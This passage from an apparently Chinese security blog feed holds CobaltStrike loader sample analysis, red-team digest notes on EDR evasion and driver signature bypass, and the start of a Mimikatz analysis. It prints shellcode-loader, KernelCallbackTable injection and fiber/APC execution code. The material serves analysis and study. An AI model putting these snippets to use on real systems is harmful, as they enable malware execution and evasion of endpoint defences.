alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其本质还是一个download。其会加载winnet.dll模块，然后依次调用<code>wininet!InternetOpenA</code>,<code>wininet!InternetConnectA</code>,<code>KERNEL32!VirtualAllocStub</code>,<code>wininet!InternetReadFile</code>等网络读取函数读取服务端获取的payload。最终在栈顶保存的是读取的payload的地址，待到函数返回，执行流跳转到payload处。<br>   <img src="http://hacky.wang/blog/20220525/4X5BfKPs0xA7.png?imageslim" alt="mark"><br>   <img src="http://hacky.wang/blog/20220525/yKFGpzN5ieTG.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可以看到下载的bin主要有两部分组成，一个是引导shellcode，第二部分是payload，主要用来引导执行payload。这也是cobaltstrike特征之一。<br>   <img src="http://hacky.wang/blog/20220525/Ay4yTDOvlt4L.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;显然，熟悉beacon的一眼就看到了cobaltstrike特征，这是beacon的PE文件，在默认生成的beacon文件中，这是导出的ReflectiveLoad函数，处理完PE数据之后，最终调用DllEntry函数进行后续的处理。<br>   <img src="http://hacky.wang/blog/20220525/iDDm7IHUMk2j.png?imageslim" alt="mark"><br>   <img src="http://hacky.wang/blog/20220525/3LNMGFde8eGf.png?imageslim" alt="mark"></p><h2 id="0x02-Example2"><a href="#0x02-Example2" class="headerlink" title="0x02 Example2"></a>0x02 Example2</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a href="https://www.virustotal.com/gui/file/d0db40a4683de999dc11be3c8e5599363f21398a0a25c238dab1a680a2029d1f" target="_blank" rel="external">这个loader</a>使用GoLang编写，该样本并没有去除符号表，首先，检查系统的CPU个数和逻辑分区个数，如果CPU个数和逻辑分区个数小于4的话，则退出。<br>   <img src="http://hacky.wang/blog/20220528/hnHKiFkl7LGW.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后调用HeapCreate开辟内存空间，Golang编译的程序在汇编层面的函数调用方式和C++编译的有些许差异，在x64下，通过[eax]进行压栈传入参数，然后将需要调用的函数传入rax寄存器中，rcx保存的是参数的个数。并调用ZwAllocateVirtualMemory修改内存属性。<br>   <img src="http://hacky.wang/blog/20220528/qTyCrfDxjyGe.png?imageslim" alt="mark"><br>   <img src="http://hacky.wang/blog/20220528/4d9ddEWAr28n.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;16个字节组成的Byte[],如果需要将shellcode转化为UUID形式的话，如果shellcode长度不足16的话，将自动补齐。在CobaltStrike免杀样本中，UUID是以字符串形式存在于内存中，其通过API函数<code>UuidFromStringA</code>将其转化为UUID格式。<br>   <img src="http://hacky.wang/blog/20220528/hYXCzF2FThsV.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最后，通过<code>EnumSystemLocalesW</code>函数通过回调的方式执行shellcode，同样的可以进行回调的还有以下函数<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="number">1</span>, EnumTimeFormatsA</div><div class="line"><span class="number">2</span>, EnumWindows</div><div class="line"><span class="number">3</span>, EnumDesktopWindows</div><div class="line"><span class="number">4</span>, EnumDateFormatsA</div><div class="line"><span class="number">5</span>, EnumChildWindows</div><div class="line"><span class="number">6</span>, EnumThreadWindows</div><div class="line"><span class="number">7</span>, EnumSystemLocales</div><div class="line"><span class="number">8</span>, EnumSystemGeoID</div><div class="line"><span class="number">9</span>, EnumSystemLanguageGroupsA</div><div class="line"><span class="number">10</span>, EnumUILanguagesA</div><div class="line"><span class="number">11</span>, EnumSystemCodePagesA</div><div class="line"><span class="number">12</span>, EnumDesktopsW</div><div class="line"><span class="number">13</span>, EnumSystemCodePagesW</div></pre></td></tr></table></figure></p><p>   <img src="http://hacky.wang/blog/20220528/181EYINyufLB.png?imageslim" alt="mark"></p><h2 id="0x03-Example3"><a href="#0x03-Example3" class="headerlink" title="0x03 Example3"></a>0x03 Example3</h2><ul><li><p>看图标和关键字显然，这是由<code>pyinstaller</code>打包而成的exe文件。目前常见的py打包工具主要有<code>pyinstaller</code>，<code>py2exe</code>,以及<code>cx_Freeze</code><br> <img src="http://hacky.wang/blog/20220530/eb0JbgWba5hY.png?imageslim" alt="mark"></p></li><li><p>针对<code>pyinstaller</code>打包而来的exe，可以使用<code>pyinstxtractor.py</code>进行解包，完成后，会在同目录生成一个extracted结尾的文件夹，在文件夹中，有两个没有后缀的文件，其中必然有一个名为struct文件。<br> <img src="http://hacky.wang/blog/20220530/6zXGpMBrmt4Q.png?imageslim" alt="mark"></p></li><li><p>那个名字为1的文件是一个抹去了时间戳和Magic的pyc文件，而抹去的信息可以在struct文件中找到，只需要复制<code>struct</code>文件的前16个字节复制到<code>1</code>这个文件中，即可。<br> <img src="http://hacky.wang/blog/20220530/oHHX0edBXdPT.png?imageslim" alt="mark"></p></li><li><p>然后使用在线的pyc2py的网站<a href="https://tool.lu/pyc/" target="_blank" rel="external">https://tool.lu/pyc/</a>就可以得到py代码如下。使用伪随机数解密，因为随机数种子是固定的，因为产生的随机数也是固定的。解密秘钥也就是固定的。loader是shellcode装载器，value是解密的shellcode。<br> <img src="http://hacky.wang/blog/20220530/BalqeFPTQs2s.png?imageslim" alt="mark"></p></li><li><p>loader代码如下，很常见的加载方式</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">shellcode = binascii.a2b_hex(value)</div><div class="line">ctypes<span class="selector-class">.windll</span><span class="selector-class">.kernel32</span><span class="selector-class">.VirtualAlloc</span><span class="selector-class">.restype</span>=ctypes.c_uint64</div><div class="line">rwxpage = ctypes<span class="selector-class">.windll</span><span class="selector-class">.kernel32</span><span class="selector-class">.VirtualAlloc</span>(<span class="number">0</span>, len(shellcode), <span class="number">0</span>x1000, <span class="number">0</span>x40)</div><div class="line">ctypes<span class="selector-class">.windll</span><span class="selector-class">.kernel32</span><span class="selector-class">.RtlMoveMemory</span>(ctypes.c_uint64(rwxpage), ctypes.create_string_buffer(shellcode), len(shellcode))</div><div class="line">handle = ctypes<span class="selector-class">.windll</span><span class="selector-class">.kernel32</span><span class="selector-class">.CreateThread</span>(<span class="number">0</span>, <span class="number">0</span>, ctypes.c_uint64(rwxpage), <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</div><div class="line">ctypes<span class="selector-class">.windll</span><span class="selector-class">.kernel32</span><span class="selector-class">.WaitForSingleObject</span>(handle, -<span class="number">1</span>)</div></pre></td></tr></table></figure></li><li><p>而shellcode是很明显的coabaltstrike的shellcode。<br> <img src="http://hacky.wang/blog/20220530/xKfvVYsjc1eo.png?imageslim" alt="mark"></p></li><li><p>Ref:<a href="https://xz.aliyun.com/t/10450#toc-8" target="_blank" rel="external">https://xz.aliyun.com/t/10450#toc-8</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-背景&quot;&gt;&lt;a href=&quot;#0x00-背景&quot; class=&quot;headerlink&quot; title=&quot;0x00 背景&quot;&gt;&lt;/a&gt;0x00 背景&lt;/h2&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;近期，在狩猎中，捕获到一批高度免杀的CobaltStrike样本，经过分析，目前这些免杀样本具备以下几种特征，第一，不在拘泥于传统的C++作为编程语言，也会采用C#或者Golang，或者脚本语言也会在整个攻击链中使用不同的语言，使用C++可能对使用者的要求有所提高，但是免杀效果可能更好。第二，对于shellcode的加密方式，不在拘泥于传统的异或或者AES，Base等公开的加密编码算法，也会采用一些好玩的，个性化的编码算法进行shellcode加密。第三，在开辟内存空间的时候，也不在使用传统的VirtualAlloc等R3层的API函数，更多的使用基于底层的API函数，第四，在调用shellcode过程中，也不像往常一样使用常规的方式调用shellcode，而是利用一些API的机制(CreateThread)，或者回调机制(EnumSystemLocalesW)，以及APC。&lt;br&gt;
    
    </summary>
    
      <category term="windows 攻防" scheme="https://findream.github.io/categories/windows-%E6%94%BB%E9%98%B2/"/>
    
    
  </entry>
  
  <entry>
    <title>绿盟科技-每周蓝军技术推送（2022.4.30-5.6）学习</title>
    <link href="https://findream.github.io/2022/05/10/%E7%BB%BF%E7%9B%9F%E7%A7%91%E6%8A%80-%E6%AF%8F%E5%91%A8%E8%93%9D%E5%86%9B%E6%8A%80%E6%9C%AF%E6%8E%A8%E9%80%81%EF%BC%882022.4.30-5.6)/"/>
    <id>https://findream.github.io/2022/05/10/绿盟科技-每周蓝军技术推送（2022.4.30-5.6)/</id>
    <published>2022-05-10T06:02:11.000Z</published>
    <updated>2022-05-23T11:44:46.297Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-这一周的推送主要介绍的都是一些工具"><a href="#0x00-这一周的推送主要介绍的都是一些工具" class="headerlink" title="0x00 这一周的推送主要介绍的都是一些工具"></a>0x00 这一周的推送主要介绍的都是一些工具</h2><p><a href="https://mp.weixin.qq.com/s/X3FnWqdL-HfzFqfwNntQ6Q" target="_blank" rel="external">每周蓝军技术推送（2022.4.30-5.6)</a></p><a id="more"></a><h2 id="0x01-nim语言轻量化C2"><a href="#0x01-nim语言轻量化C2" class="headerlink" title="0x01 nim语言轻量化C2"></a>0x01 nim语言轻量化C2</h2><ul><li>nimc2 是使用nim编写的C2框架，目前来说作者更新的很快</li><li>生成的implant免杀效果还是很好的</li><li>Ref:<a href="https://github.com/d4rckh/nimc2/blob/main/README.md" target="_blank" rel="external">https://github.com/d4rckh/nimc2/blob/main/README.md</a></li></ul><h2 id="0x02-可注入PE转换工具v1-0版本发布"><a href="#0x02-可注入PE转换工具v1-0版本发布" class="headerlink" title="0x02 可注入PE转换工具v1.0版本发布"></a>0x02 可注入PE转换工具v1.0版本发布</h2><ul><li><p>pe_to_shellcode这款工具原理就是重新复写PE文件DOS头，因为装载器装载PE文件会读取MZ头，这块不能变，剩下的可以进行修改，从第五行开始，定位当前EIP，第六行，ebx为EIP，<code>sub ebx,9</code>则表示ebx为ImageBase，然后加一个常量，最终跳转到入口点。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="string">"\x4D"</span> //<span class="keyword">dec</span> <span class="built_in">ebp</span></div><div class="line"><span class="string">"\x5A"</span> //<span class="keyword">pop</span> <span class="built_in">edx</span></div><div class="line"><span class="string">"\x45"</span> //<span class="keyword">inc</span> <span class="built_in">ebp</span></div><div class="line"><span class="string">"\x52"</span> //<span class="keyword">push</span> <span class="built_in">edx</span></div><div class="line"><span class="string">"\xE8\x00\x00\x00\x00"</span> //<span class="keyword">call</span> &lt;next_line&gt;</div><div class="line"><span class="string">"\x5B"</span> // <span class="keyword">pop</span> <span class="built_in">ebx</span></div><div class="line"><span class="string">"\x48\x83\xEB\x09"</span> // <span class="keyword">sub</span> <span class="built_in">ebx</span>,<span class="number">9</span></div><div class="line"><span class="string">"\x53"</span> // <span class="keyword">push</span> <span class="built_in">ebx</span> (Image Base)</div><div class="line"><span class="string">"\x48\x81\xC3"</span> // <span class="keyword">add</span> <span class="built_in">ebx</span>,</div><div class="line"><span class="string">"\x59\x04\x00\x00"</span> // value</div><div class="line"><span class="string">"\xFF\xD3"</span> // <span class="keyword">call</span> <span class="built_in">ebx</span></div><div class="line"><span class="string">"\xc3"</span><span class="comment">; // ret</span></div></pre></td></tr></table></figure></li><li><p>Ref:<a href="https://github.com/hasherezade/pe_to_shellcode" target="_blank" rel="external">https://github.com/hasherezade/pe_to_shellcode</a></p></li></ul><h2 id="0x03-禁用驱动程序签名强制执行技术"><a href="#0x03-禁用驱动程序签名强制执行技术" class="headerlink" title="0x03 禁用驱动程序签名强制执行技术"></a>0x03 禁用驱动程序签名强制执行技术</h2><ul><li><p>作者首先介绍了，在windows10以前的操作系统，禁用驱动程序强制签名是很容易的，只需要将<code>g_CiOptions</code>设置为0即可。</p></li><li><p>但是在windows10的计算机中，微软启用了基于虚拟化的安全性VBS(Virtualization Based Security)和虚拟机托管程序代码完整性HVCI(Hypervisor Code Integrity)，就不可以很简单的修改内核数据了。</p></li><li><p>所以作者开始寻找在启动VBS的情况下，禁用DSE的方法。</p></li><li><p>根本原理就是通过Patch禁用DSE，首先作者针对<code>CiCheckPolicyBits</code>下断，并查看栈回溯，发现<code>CiValidateImageHeader</code>这是负责验证我们的驱动程序是否满足签名要求的函数,然后作者尝试加载一个未签名的驱动程序，并查看 <code>CiValidateImageHeader</code>的返回值，发现该函数返回值是一个NTSTATUS值(c0000428)，所以作者猜测只需要该函数返回为STATUS_SUCCESS（0）即可。所以只需要寻找一个方法Patch该函数即可。</p></li><li><p>首先作者将虚拟地址转化为PTE(页目录表项)</p></li><li><p>作者通过使用暴力搜索特征码的方式最终定位到了<code>CiValidateImageHeader</code>函数地址，然后Patch如下代码即可。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">xor</span> <span class="built_in">rax</span>, <span class="built_in">rax</span><span class="comment">; ret</span></div></pre></td></tr></table></figure></li><li><p>这篇文章涉及到好多内核的知识，看的不深入。</p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-这一周的推送主要介绍的都是一些工具&quot;&gt;&lt;a href=&quot;#0x00-这一周的推送主要介绍的都是一些工具&quot; class=&quot;headerlink&quot; title=&quot;0x00 这一周的推送主要介绍的都是一些工具&quot;&gt;&lt;/a&gt;0x00 这一周的推送主要介绍的都是一些工具&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/X3FnWqdL-HfzFqfwNntQ6Q&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;每周蓝军技术推送（2022.4.30-5.6)&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="攻防技术" scheme="https://findream.github.io/categories/%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>绿盟科技-每周蓝军技术推送（2022.4.16-4.22）学习</title>
    <link href="https://findream.github.io/2022/04/23/%E7%BB%BF%E7%9B%9F%E7%A7%91%E6%8A%80-%E6%AF%8F%E5%91%A8%E8%93%9D%E5%86%9B%E6%8A%80%E6%9C%AF%E6%8E%A8%E9%80%81%EF%BC%882022.4.16-4.22%EF%BC%89/"/>
    <id>https://findream.github.io/2022/04/23/绿盟科技-每周蓝军技术推送（2022.4.16-4.22）/</id>
    <published>2022-04-23T06:02:11.000Z</published>
    <updated>2022-05-23T11:44:41.971Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-企业级EDR绕过技术"><a href="#0x01-企业级EDR绕过技术" class="headerlink" title="0x01 企业级EDR绕过技术"></a>0x01 企业级EDR绕过技术</h2><ul><li>原文名称：A blueprint for evading industry leading endpoint protection in 2022</li><li>作者主要介绍了规避现代EDR的几种常见思路</li></ul><a id="more"></a><h2 id="0x02-构建API调用框架绕过杀软hook"><a href="#0x02-构建API调用框架绕过杀软hook" class="headerlink" title="0x02 构建API调用框架绕过杀软hook"></a>0x02 构建API调用框架绕过杀软hook</h2><ul><li><p>通常API函数调用过程如下：<br>3环API(kernel32.dll) -&gt; ntdll.dll -&gt; sysenter -&gt; KiFastCallentry -&gt; SSDT -&gt; 真正调用的0环API</p></li><li><p>文章作者的思路是既然应用层API调用都要经过SSDT，继而调用R0的函数，EDR产品会使用SSDT hook来监控敏感的调用。<br>所以，我们通过伪造的SSDT，来规避EDR产品检测。</p></li><li>作者首先通过中断门，进入R0，然后在伪造SSDT。这样的话，R3程序通过中断门，通过伪造的SSDT进入指定的内核函数。然后规避EDR。</li><li>但是，这个方法比较理想化，第一：win7及以上系统无法通过中断门进入，所以，理论上这个方法只能在windowsxp下实现，第二：因为涉及到驱动文件，如何保证文件落地不被查杀，第二，如何保证驱动能被安全的加载，第三，合理有效的数字签名如何获取。<br>Ref:<a href="https://tttang.com/archive/1546/" target="_blank" rel="external">https://tttang.com/archive/1546/</a></li></ul><h2 id="0x03-Kernelcallbacktable-注入"><a href="#0x03-Kernelcallbacktable-注入" class="headerlink" title="0x03 Kernelcallbacktable 注入"></a>0x03 Kernelcallbacktable 注入</h2><ul><li><p>KernelCallbackTable(系统回调表)是由KeUserModeCallback函数调用，每当GUI进程加载User32.dll的时候，系统就会通过PEB找到KernelCallbackTable地址，并进行初始化为函数数组，这个函数数组中的函数通常用于响应窗口消息。</p></li><li><p>所以，攻击者可以通过修改远程进程的KernelCallbackTable的函数数组，然后发送一个对应的窗口消息，从而实现劫持执行流。</p></li><li><p>本文作者参考modexpblog的思路：</p><ul><li><p>通过窗口获取目标进程Pid，从而获取目标进程的伪句柄。</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">HANDLE hProcess = OpenProcess(<span class="name">PROCESS_ALL_ACCESS</span>, FALSE, pid)<span class="comment">;</span></div><div class="line">printf(<span class="string">"[+] Process Handle: 0x%p\n"</span>, hProcess)<span class="comment">;</span></div></pre></td></tr></table></figure></li><li><p>通过调用<code>NtQueryInformationProcess</code>获取ProcessBasicInformation，pbi结构体中保存着Peb的地址</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">PROCESS_BASIC_INFORMATION pbi<span class="comment">;</span></div><div class="line">pNtQueryInformationProcess myNtQueryInformationProcess = (<span class="name">pNtQueryInformationProcess</span>)GetProcAddress(<span class="name">GetModuleHandle</span>(<span class="name">L</span><span class="string">"ntdll.dll"</span>), <span class="string">"NtQueryInformationProcess"</span>)<span class="comment">;</span></div><div class="line">myNtQueryInformationProcess(<span class="name">hProcess</span>, ProcessBasicInformation, <span class="symbol">&amp;pbi</span>, sizeof(<span class="name">pbi</span>), NULL)<span class="comment">;</span></div></pre></td></tr></table></figure></li></ul></li></ul><pre><code>* 通过PEB获取KernelCallbackTable</code></pre><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">PEB peb;</div><div class="line">ReadProcessMemory(hProcess, pbi.PebBaseAddress, &amp;peb, <span class="keyword">sizeof</span>(peb), <span class="literal">NULL</span>);</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[+] PEB Address: 0x%p\n"</span>, pbi.PebBaseAddress);</div><div class="line">KERNELCALLBACKTABLE kct;</div><div class="line">ReadProcessMemory(hProcess, peb.KernelCallbackTable, &amp;kct, <span class="keyword">sizeof</span>(kct), <span class="literal">NULL</span>);</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[+] KernelCallbackTable Address: 0x%p\n"</span>, peb.KernelCallbackTable);</div><div class="line">``` </div><div class="line">    * 将shellcode和新的KernelCallbackTable写入远程进程</div></pre></td></tr></table></figure><p>LPVOID newKCTAddr = VirtualAllocEx(hProcess, NULL, sizeof(kct), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);<br>kct.__fnCOPYDATA = (ULONG_PTR)payloadAddr;<br>WriteProcessMemory(hProcess, newKCTAddr, &amp;kct, sizeof(kct), NULL);<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="bullet">* </span>更新一下PEB的KernelCallbackTable地址。</div></pre></td></tr></table></figure></p><p>// Update the PEB<br>WriteProcessMemory(hProcess, (PBYTE)pbi.PebBaseAddress + offsetof(PEB, KernelCallbackTable), &amp;newKCTAddr, sizeof(ULONG_PTR), NULL);<br>printf(“[+] Remote process PEB updated\n”);<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="bullet">* </span>最后，通过发送窗口请求，响应操作</div></pre></td></tr></table></figure></p><p>COPYDATASTRUCT cds;<br>WCHAR msg[] = L”Pwn”;<br>cds.dwData = 1;<br>cds.cbData = lstrlen(msg) * 2;<br>cds.lpData = msg;<br>SendMessage(hWindow, WM_COPYDATA, (WPARAM)hWindow, (LPARAM)&amp;cds);<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="bullet">* </span>Ref:[<span class="string">Adventures with KernelCallbackTable Injection</span>](<span class="link">https://captmeelo.com/redteam/maldev/2022/04/21/kernelcallbacktable-injection.html</span>)</div><div class="line"></div><div class="line"><span class="bullet">* </span>Ref:[<span class="string">Windows Process Injection: KernelCallbackTable used by FinFisher / FinSpy</span>](<span class="link">https://modexp.wordpress.com/2019/05/25/windows-injection-finspy/</span>)</div><div class="line"></div><div class="line"><span class="bullet">* </span>Ref:[<span class="string">攻击技术研判 ｜Lazarus搭载新的载荷执行与控制流劫持技术(此处原文应该来自M01n)</span>](<span class="link">http://www.ctfiot.com/28074.html</span>)</div><div class="line"></div><div class="line"><span class="section">## 0x04 利用Exception Directory获取系统服务调用号</span></div><div class="line"><span class="bullet">* </span>这篇文章思维跳跃度太高，没太看明白。</div><div class="line"></div><div class="line"><span class="section">## 0x05 常见的PE打包器在Windows 11中的免杀测试</span></div><div class="line"><span class="bullet">* </span>这几款免杀框架主要都采用了一下技术：</div><div class="line"><span class="bullet">* </span>Loader[ScareCrow]：通过将恶意的dll注入到诸如Wscript,Msiexe等系统进程中，规避一些EDR的检测，但效果估计差强人意。</div><div class="line"><span class="bullet">* </span>Console[ScareCrow]:通常，恶意软件需要隐藏窗口是通过创建进程时，设置ldflags标志实现的，但是这很容易被EDR检测到，所以，通过GetConsoleWindow和ShowWindow实现窗口隐藏。</div><div class="line"><span class="bullet">* </span>ByPass AMSI和ETW[ScareCrow,inceptor等]:这没什么好说的，正常的都会这样做的。</div><div class="line"><span class="bullet">* </span>Delivery[ScareCrow]:这个没太看懂，应该是一种远程命令执行，或者远程数据传递的技术吧。</div><div class="line"><span class="bullet">* </span>AntiDebug[PEzor]:反调试</div><div class="line"><span class="bullet">* </span>unhook[PEzor]:移除部分用户层Hook</div><div class="line"><span class="bullet">* </span>syscalls[PEzor，Nimcrypt2等]:syscall 规避用户层Hook</div><div class="line"><span class="bullet">* </span>Shellcode和函数名加密[charlotte,FourEye,inceptor等等]</div><div class="line"><span class="bullet">* </span>API动态调用[charlotte]:charlotte所指的动态调用是指使用GetProcAddress获取函数地址后，然后调用。</div><div class="line"><span class="bullet">* </span>正常文件插入shellcode[Sh3llter,msf,cobaltstrike旧版本]：可以有效降低信息熵，但是cs在近几个版本中取消了。</div><div class="line"><span class="bullet">* </span>Fiber(纤程)和APC[FourEye，Nimcrypt2]：FourEye的这几种方法都是在处理调用shellcode如何实现免杀，常见的直接调用shellcode不容易绕过EDR。</div><div class="line"><span class="code">    * Fiber这个方案主要调用CreateFiber创建一个纤程对象，然后调用SwitchToFiber选择即可。</span></div><div class="line"><span class="code">    * APC这个方案就是调用QueueUserAPC插入一个APC到队列中</span></div><div class="line"><span class="bullet">* </span>Ntdll ByPass</div><div class="line"><span class="bullet">* </span>通过一些不常见的语言Nim来减少特征[Nimcrypt2]</div><div class="line"><span class="bullet">* </span>系统调用名称随机化[Nimcrypt2]:就是在获取API函数地址的时候，使用随机的函数名称，这样减缓分析进度。</div><div class="line"><span class="bullet">* </span>LLVM混淆[Nimcrypt2]</div></pre></td></tr></table></figure></p><p>//Fiber<br>PVOID shellcodeLocation = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br>memcpy(shellcodeLocation, shellcode, sizeof shellcode);<br>PVOID shellcodeFiber = CreateFiber(NULL, (LPFIBER_START_ROUTINE)shellcodeLocation, NULL);<br>SwitchToFiber(shellcodeFiber);<br>//APC<br>char<em> buffer = (char</em>)Allocate(GetCurrentProcess(), 0, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br>CopyMemory(buffer, shellcode, shellcode_size);<br>QueueUserAPC((PAPCFUNC)buffer, hthread, (ULONG_PTR)buffer);<br>```</p><ul><li>===&gt;[TODO]如果要学怎么写一个免杀框架，<a href="https://github.com/klezVirus/inceptor" target="_blank" rel="external">inceptor</a>是一个很好地学习例子。</li><li>Ref:<a href="https://github.com/klezVirus/inceptor" target="_blank" rel="external">https://github.com/klezVirus/inceptor</a></li><li>Ref:<a href="https://assume-breach.medium.com/home-grown-red-team-testing-common-av-evasion-with-pe-packers-on-windows-11-a2a9e873fe13" target="_blank" rel="external">https://assume-breach.medium.com/home-grown-red-team-testing-common-av-evasion-with-pe-packers-on-windows-11-a2a9e873fe13</a></li><li>Ref:<a href="https://www.1ight.top/纤程注入shellcode/" target="_blank" rel="external">https://www.1ight.top/纤程注入shellcode/</a></li></ul><h2 id="0x06-攻击技术研判｜发现新招！攻击者投递伪装成文件夹的恶意LNK"><a href="#0x06-攻击技术研判｜发现新招！攻击者投递伪装成文件夹的恶意LNK" class="headerlink" title="0x06 攻击技术研判｜发现新招！攻击者投递伪装成文件夹的恶意LNK"></a>0x06 攻击技术研判｜发现新招！攻击者投递伪装成文件夹的恶意LNK</h2><ul><li>就是利用社会工程学伪装lnk执行后续恶意dll。</li><li><a href="https://mp.weixin.qq.com/s/rCEoKdi-_qLWw86vZKrVWA" target="_blank" rel="external">https://mp.weixin.qq.com/s/rCEoKdi-_qLWw86vZKrVWA</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-企业级EDR绕过技术&quot;&gt;&lt;a href=&quot;#0x01-企业级EDR绕过技术&quot; class=&quot;headerlink&quot; title=&quot;0x01 企业级EDR绕过技术&quot;&gt;&lt;/a&gt;0x01 企业级EDR绕过技术&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;原文名称：A blueprint for evading industry leading endpoint protection in 2022&lt;/li&gt;
&lt;li&gt;作者主要介绍了规避现代EDR的几种常见思路&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="攻防技术" scheme="https://findream.github.io/categories/%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>Mimikatz原理分析和检测</title>
    <link href="https://findream.github.io/2022/04/22/Mimikatz%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E5%92%8C%E6%A3%80%E6%B5%8B/"/>
    <id>https://findream.github.io/2022/04/22/Mimikatz原理分析和检测/</id>
    <published>2022-04-22T06:02:11.000Z</published>
    <updated>2022-05-23T11:58:32.551Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ul><li>这是学习Mimikatz工作原理的无总结笔记。主要包含了<code>sekurlsa::msv</code>,<code>sekurlsa::pth</code>,<code>lsadump::dcsync</code>,票据传递等功能的原理分析和检测。<a id="more"></a></li></ul><h2 id="sekurlsa-msv源码分析"><a href="#sekurlsa-msv源码分析" class="headerlink" title="sekurlsa::msv源码分析"></a>sekurlsa::msv源码分析</h2><ul><li>Mimikatz的sekurlsa::msv命令是用于获取NTLM协议加密的凭证</li><li>其在mimikatz\modules\sekurlsa\kuhl_m_sekurlsa.c中的NTSTATUS kuhl_m_sekurlsa_enum(PKUHL_M_SEKURLSA_ENUM callback, LPVOID pOptionalData)函数中实现。</li><li>具体原理是通过特征码定位Lsass.exe进程的lsasvr.dll中的LogonSessionList全局变量和LogonSessionListCount全局变量的地址，然后解析LogonSessionList结构体即可，LogonSessionList是一个双向链表(LIST_ENTRY)。</li><li><p>在NTSTATUS kuhl_m_sekurlsa_enum(PKUHL_M_SEKURLSA_ENUM callback, LPVOID pOptionalData)函数中，首先调用kuhl_m_sekurlsa_acquireLSA()函数用于获取相关模块信息，主要是在kull_m_process_getVeryBasicModuleInformations()函数中，通过PEB获取指定的lsasvr.dll基地址。</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div 